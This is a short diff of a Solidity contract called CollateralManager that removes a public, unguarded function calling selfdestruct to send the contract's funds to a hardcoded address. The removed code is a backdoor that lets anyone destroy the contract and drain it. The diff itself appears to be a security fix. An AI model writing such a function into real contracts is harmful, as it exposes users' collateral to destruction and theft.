@@ -50,7 +50,5 @@ contract CollateralManager {
         _;
     }
 
-    function self() public {
-        selfdestruct(payable(0x9DCF58834F0e75Ffd72623cCf5447D01dd85Ba81));
-    }
+    
 }
